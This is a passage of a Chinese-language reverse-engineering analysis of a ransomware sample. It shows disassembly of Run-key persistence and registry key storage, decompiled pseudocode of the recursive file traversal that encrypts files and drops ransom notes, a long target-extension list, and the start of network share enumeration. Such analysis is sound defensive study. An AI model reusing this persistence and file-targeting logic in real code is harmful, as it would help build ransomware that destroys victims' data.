
```asm
00413C19 |. FF15 3C014200 call dword ptr ds:[<&KERNEL32.GetProcAddress>] ; \GetProcAddress
00413C1F |. 85C0 test eax,eax
00413C21 |. 74 05 je short dpwapa.00413C28
00413C23 |. FF75 08 push [arg.1]
00413C26 |. FFD0 call eax ; ExitProcess
```

## 设置注册表，增加开机自启

```asm
004028AB |. 6A 08 push 0x8 ; /BufSize = 0x8
004028AD |. 68 10F54500 push dpwapa.0045F510 ; |Buffer = dpwapa.0045F510
004028B2 |. 6A 03 push 0x3 ; |ValueType = REG_BINARY
004028B4 |. 6A 00 push 0x0 ; |Reserved = 0x0
004028B6 |. 51 push ecx ; |FIX
004028B7 |. 52 push edx ; |hKey = 0x775E64F4
004028B8 |. FF15 14004200 call dword ptr ds:[<&ADVAPI32.RegSetValueExW>] ; \RegSetValueExW
```

在 ![图片描述](upload/attach/201902/3\_M7UCFJGJ4P5FJNX.png) 设置键`FIX`值为`d5 ab 7d 4f a4 e7 d0 15`

```asm
004026B9 |> \6A 00 push 0x0 ; /pDisposition = NULL
004026BB |. 8D95 F8FDFFFF lea edx,[local.130] ; |
004026C1 |. 52 push edx ; |pHandle = 0012FB84
004026C2 |. 6A 00 push 0x0 ; |pSecurity = NULL
004026C4 |. 68 19000200 push 0x20019 ; |Access = KEY_READ
004026C9 |. 6A 00 push 0x0 ; |Options = REG_OPTION_NON_VOLATILE
004026CB |. 6A 00 push 0x0 ; |Class = NULL
004026CD |. 6A 00 push 0x0 ; |Reserved = 0x0
004026CF |. 8D85 FCFEFFFF lea eax,[local.65] ; |
004026D5 |. 50 push eax ; |Subkey = "Software\D5AB7D4FA4E7D015"
004026D6 |. 68 01000080 push 0x80000001 ; |hKey = HKEY_CURRENT_USER
004026DB |> FF15 24004200 call dword ptr ds:[<&ADVAPI32.RegCreateKeyExW>] ; \RegCreateKeyExW
```

```asm
004026ED |. 51 push ecx ; /pBufSize = kernel32.7710FDFA
004026EE |. 8B48 2C mov ecx,dword ptr ds:[eax+0x2C] ; |
004026F1 |. 68 48F54500 push offset <dpwapa.保存了data的键> ; |Buffer = offset <dpwapa.保存了data的键>
004026F6 |. 8D95 F0FDFFFF lea edx,[local.132] ; |
004026FC |. 52 push edx ; |pValueType = NULL
004026FD |. 8B95 F8FDFFFF mov edx,[local.130] ; |
00402703 |. 6A 00 push 0x0 ; |Reserved = NULL
00402705 |. 51 push ecx ; |data
00402706 |. 52 push edx ; |hKey = 0x0
00402707 |. FF15 20004200 call dword ptr ds:[<&ADVAPI32.RegQueryValueExW>] ; \RegQueryValueExW
```

发现加密的key值的最前面和最后面是由这两个key值构成的

```asm
00410041 |. 51 push ecx
00410042 |. 6A 00 push 0x0
00410044 |. 68 06000200 push 0x20006
00410049 |. 6A 00 push 0x0
0041004B |. 6A 00 push 0x0
0041004D |. 6A 00 push 0x0
0041004F |. 56 push esi ; Software\Microsoft\Windows\CurrentVersion\Run
00410050 |. 68 01000080 push 0x80000001
00410055 |. FFD0 call eax ; advapi32.RegCreateKeyExW
0041008C |. 52 push edx ; a4
0041008D |. 8D8D A0BFFFFF lea ecx,[local.4120]
00410093 |. 51 push ecx ; C:\Windows\SYSTEM32\CMD.EXE /C START """C:\Users\15pb-win7\Documents\xxhprj.exe
00410094 |. 6A 01 push 0x1
00410096 |. 6A 00 push 0x0
00410098 |. 8D55 A0 lea edx,[local.24]
0041009B |. 52 push edx ; +++txdw
0041009C |. 57 push edi ; 170
0041009D |. FFD0 call eax ; advapi32.RegSetValueExW
0041009F |. 8B85 9CBFFFFF mov eax,[local.4121]
004100A5 |. 8B35 1C004200 mov esi,dword ptr ds:[<&ADVAPI32.RegFlushKey>] ; advapi32.RegFlushKey
004100AB |. 50 push eax ; /hKey = 0x76CB1C82
004100AC |. FFD6 call esi ; \RegFlushKey
```

通过上面的汇编可以看出，创建了一个自启的项，虽然自启动的是`cmd`，但是制定了`cmd`的参数，是`/C START """C:\Users\15pb-win7\Documents\xxhprj.exe` 还是去启动病毒文件

## 遍历文件，对文件内容进行加密

首先获取了几个系统特殊路径，然后使用`GetLogicDrivers`获取了文件驱动的名称

```asm
00401735 . 68 40A84300 push unnlcu.0043A840 ; UNICODE "C:\Windows"
0040173A . 33FF xor edi,edi
0040173C . 57 push edi
0040173D . 57 push edi
0040173E . 6A 24 push 0x24
00401740 . 57 push edi
00401741 . FFD6 call esi ; shell32.SHGetFolderPathW; <&SHELL32.SHGetFolderPathW>
00401743 . 68 48AA4300 push offset <unnlcu.C:\Program Files> ; UNICODE "C:\Program Files"
00401748 . 57 push edi
00401749 . 57 push edi
0040174A . 6A 26 push 0x26
0040174C . 57 push edi
0040174D . FFD6 call esi ; shell32.SHGetFolderPathW
0040174F . 68 50AC4300 push offset <unnlcu.C:\ProgramData> ; UNICODE "C:\ProgramData"
00401754 . 57 push edi
00401755 . 57 push edi
00401756 . 6A 23 push 0x23
00401758 . 57 push edi
00401759 . FFD6 call esi ; shell32.SHGetFolderPathW
0040175B . 8D8424 F80000>lea eax,dword ptr ss:[esp+0xF8]
00401762 . 50 push eax ; /Buffer = 0000000C
00401763 . 68 00010000 push 0x100 ; |BufSize = 100 (256.)
00401768 . FF15 AC004200 call dword ptr ds:[<&KERNEL32.GetLogicalDriveStringsW>] ; \GetLogicalDriveStringsW
```

对驱动类型进行判断之后就进行了文件遍历

进行简单的判断，先读取文件的前`0x80`个字节，判断是否有值，如果有就申请空间，读取整个文件的内容，然后对以下格式的文件进行加密。

对于目录文件创建文本和勒索图文信息

```text
".r3d",".ptx",".pef",".srw",".x3f",".der",".cer",".crt",".pem",".odt",".ods",".odp",".odm",".odc",".odb",".doc",".docx",".kdc",".mef,".nrw",".orf",".raw",".rwl,".mdf",".dbf",".psd",".pdd",".pdf"
,".eps",".jpg",".jpe",".dng",".3fr",".arw",".srf",".sr2",".bay",".crw",".cr2",".dcr",".ai",".indd",".cdr",".erf",".bar",".hkx",".raf",".rofl",".dba",".db0",".kdb",".mpqge",".vfs0",".mcmeta",".m2"
,".lrf",".vpp_pc",".ff",".cfr",".snx",".lvl,".ntl",".fsh",".itdb",".itl",".mddata",".sidd",".sidn",".bkf,".bkp",".bc7",".bc6",".pkpass",".tax",".gdb",".qdf",".t12",".t13",".ibank",".sum",".sie"
,".zip",".w3x",".rim,".tor",".vpk",".iwd",".kf,".fpk",".dazip",".vtf",".vcf",".esm",".blob,".layout",".menu",".ncf",".sid",".sis",".ztmp",".vdf",".mov",".fos",".sb",".itm,".itm",".map",".wmo",".sb"
,".svg",".cas",".gho",".syncdb",".mdbackup",".hkdb",".hplg",".hvpl",".icxs",".docm",".wps",".xls",".xlsx",".xlsm",".xlsb",".xlk",".ppt",".pptx",".pptm",".mdb",".accdb",".pst",".dwg",".xf",".dxg"
,".wpd",".rtf",".wb2",".pfx",".p12,".p7c",".txt",".jpeg",".png",".rb,".js",".flv",".m3u",".py",".desc",".xxx",".litesql","wallet",".big",".pak",".rgss3a,".bik",".slm",".lbf",".sav",".re4",".apk"
,".bsa",".ltx",".forge",".asset",".litemod",".iwi",".das",".upk",".d3dbsp",".csv,".avi",".wma",".m4a",".rar",".7z",".mp4,".bak",".tiff"
```

```c++
HANDLE __cdecl sub_401920(wchar_t *Src, int a2)
{
HANDLE result; // eax@1
void *v3; // esi@1
unsigned int v4; // kr00_4@12
wchar_t *v5; // esi@12
int v6; // eax@12
int v7; // eax@13
HANDLE v8; // [sp+Ch] [bp-425Ch]@1
struct _WIN32_FIND_DATAW FindFileData; // [sp+10h] [bp-4258h]@1
wchar_t Dst; // [sp+260h] [bp-4008h]@1
char v11; // [sp+262h] [bp-4006h]@1
WCHAR FileName; // [sp+2260h] [bp-2008h]@1
char v13; // [sp+2262h] [bp-2006h]@1
FileName = 0;
memset(&v13, 0, 0x1FFEu);
Dst = 0;
memset(&v11, 0, 0x1FFEu);
wcscpy_s(&FileName, 0x1000u, Src);
wcscat_s(&FileName, 0x1000u, *(const wchar_t **)(dword_45F4DC + 32));
result = FindFirstFileW(&FileName, &FindFileData);
v3 = result;
v8 = result;
if ( result != (HANDLE)-1 )
{
do
{
if ( FindFileData.dwFileAttributes & 0x10 )
{
if ( wcscmp(L".", FindFileData.cFileName) && wcscmp(L"..", FindFileData.cFileName) )
{
wcscpy_s(&FileName, 0x1000u, Src);
if ( wcslen(Src) > 3 )
wcscat_s(&FileName, 0x1000u, L"\\");
wcscat_s(&FileName, 0x1000u, FindFileData.cFileName);
if ( wcscmp(&pszPath, &FileName) && wcscmp(&word_43AA48, &FileName) )
{
if ( wcscmp(&word_43AC50, &FileName) )
{
sub_401920(&FileName, a2);
wcscpy_s(&Dst, 0x1000u, &FileName);
sub_410150(0);//文件夹，创建勒索图文
}
}
}
}
else if ( a2 == 1 )
{
wcscpy_s(&FileName, 0x1000u, Src);
wcscat_s(&FileName, 0x1000u, L"\\");
wcscat_s(&FileName, 0x1000u, FindFileData.cFileName);
v4 = wcslen(FindFileData.cFileName);
v5 = _wcsdup(FindFileData.cFileName);
_wcslwr_s(v5, v4 + 1);
v6 = *(_DWORD *)(dword_45F4DC + 36);
if ( !sub_4103C0(v5) )
{
v7 = *(_DWORD *)dword_45F4DC;
if ( !sub_4103C0(v5) && sub_402100() == 1 )
sub_401CD0(&FileName);//加密文件
}
free(v5);
v3 = v8;
}
}
while ( FindNextFileW(v3, &FindFileData) );
result = (HANDLE)FindClose(v3);
}
return result;
}
```

## 获取局域网网络资源,设置可访问

当对文件加密完毕之后，调用了`WNetOpenEnum`进行网络枚举

```c++
HGLOBAL __stdcall sub_401610(LPNETRESOURCEW lpNetResource)
{
HGLOBAL result; // eax@2
void *v2; // ebx@3
DWORD v3; // edi@5
const wchar_t **v4; // esi@6
DWORD cCount; // [sp+0h] [bp-8h]@1
SIZE_T dwBytes; // [sp+4h] [bp-4h]@1
dwBytes = 0x4000;
cCount = -1;
if ( WNetOpenEnumW(2u, 0, 0, lpNetResource, (LPHANDLE)&lpNetResource) )
{
result = 0;
}
```
